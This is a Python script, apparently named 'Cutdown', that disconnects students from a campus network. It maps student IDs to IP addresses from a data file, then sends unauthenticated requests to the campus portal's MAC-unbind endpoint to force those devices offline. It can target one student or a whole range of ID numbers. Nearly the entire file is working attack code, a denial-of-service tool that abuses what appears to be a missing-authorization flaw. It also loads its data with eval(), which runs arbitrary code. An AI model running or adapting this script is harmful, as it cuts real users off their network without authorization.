import requests
import inspect
import json
import sys

def int_to_ip(integer_value):
    a = (integer_value >> 24) & 0xFF
    b = (integer_value >> 16) & 0xFF
    c = (integer_value >> 8) & 0xFF
    d = integer_value & 0xFF
    return f"{a}.{b}.{c}.{d}"

def ip_to_int(ip_address:str):
    a, b, c, d = map(int, ip_address.split('.'))
    return (a << 24) + (b << 16) + (c << 8) + d
# TODO: Change this function first,then delete this comment line.
def cutdown(data:list,**kwargs):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Referer": "http://XX.XX.XX.XX/" # Change this
    }
    
    def unbind_ip(ip):
        r = requests.get(f"http://XX.XX.XX.XX:801/eportal/portal/mac/unbind?wlan_user_mac=000000000000&wlan_user_ip={ip_to_int(ip)}", headers=headers) # Change this.
        if r.status_code == 200:
            response_data = json.loads(r.text[12:-2])
            if response_data['result'] == 1:
                print(f"{YELLOW}[+] The IP address {ip} has been shut down.{RESET}\n{response_data}")
            else:
                print(f'{RED}[*] Oops, got some issues: {response_data}{RESET}')
        else:
            print(f'{RED}[FAILED] {r.status_code}{RESET}')

    if 'single_id' in kwargs:
        device_info = query(data, kwargs['single_id'])
        if not device_info:
            print(f"{RED}[FAILED] 未找到学号为 {kwargs['single_id']} 人员ip数据.该人员可能未注册校园网{RESET}")
        else:
            if len(device_info) > 1:
                print(f"{YELLOW}[WARNING] 目标拥有多台设备(两个及以上)，是否进行多设备同断操作？{RESET}")
                option = input('#(y/n):')
                if option == 'y':
                    for i, device in enumerate(device_info):
                        print(f'{GREEN}[INFO] Device {i}: {device["online_ip"]}{RESET}')
                        unbind_ip(device['online_ip'])
                else:
                    print('[*] Exit!')
                    sys.exit()
            else:
                unbind_ip(device_info[0]['online_ip'])
    elif 'MIN_STUDENT_ID' in kwargs and 'MAX_STUDENT_ID' in kwargs:
        for i in range(int(kwargs['MIN_STUDENT_ID']), int(kwargs['MAX_STUDENT_ID']) + 1):
            device_info = query(data, str(i))
            if not device_info:
                print(f"{RED}[FAILED] 未找到学号为 {i} 人员ip数据.该人员可能未注册校园网{RESET}")
                continue
            for device in device_info:
                unbind_ip(device['online_ip'])

def stuid_toip(data, stuid):
    for item in data:
        if item['user_account'] == stuid:
            return item['online_ip']
    return 0

def configuration(filename, data):
    with open(filename, 'r') as file:
        for line in file:
            data.append(eval(line.strip()))
    print(f'{GREEN}[+] 已读取{len(data)}行数据{RESET}\n')

def query(datalist:list, student_id:str) -> list:
    tmp_device = []
    for item in datalist:
        if item['user_account'] == student_id:
            tmp_device.append({'online_ip': item['online_ip']})
    return tmp_device

def main(data_list):
    if 'Change' in inspect.getcomments(cutdown):
        print(f"{RED}[X] Change the source_code before you use!{RESET}")
        sys.exit()
    data_file = input("请输入数据来源:")
    configuration(data_file, data_list)
    print(
        """
   ______      __      __
  / ____/_  __/ /_____/ /___ _      ______ 
 / /   / / / / __/ __  / __ \\ | /| / / __ \\
/ /___/ /_/ / /_/ /_/ / /_/ / |/ |/ / / / /
\\____/\\__,_/\\__ /\\__,_/\\____/|__/|__/_/ /_/       
        """
    )

    print(f"{YELLOW}MADE BY E1iminate1337 VERSION:0.1v{RESET}\n")

    options = input(f"{GREEN}[*]{RESET} Welcome to the Cutdown script:\n1.单个学号断网\n2.范围学号断网\n选择:")
    if options == '1':
        stuID = input("\n[*] 输入单个目标学号:")
        print(f"{GREEN}[+] Target stuID:{stuID}{RESET}")
        cutdown(data_list, single_id=stuID)
    elif options == '2':
        min_stuid = input("\nMIN_STUDENT_ID:")
        max_stuid = input("MAX_STUDENT_ID:")
        cutdown(data_list, MAX_STUDENT_ID=max_stuid, MIN_STUDENT_ID=min_stuid)
    else:
        print(f"{RED}[FAILED] 请勿输入选项外的数字或内容{RESET}+\n{RED}[*] Exit!{RESET}")

if __name__ == "__main__":
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    RESET = "\033[0m"
    data = []

    main(data)
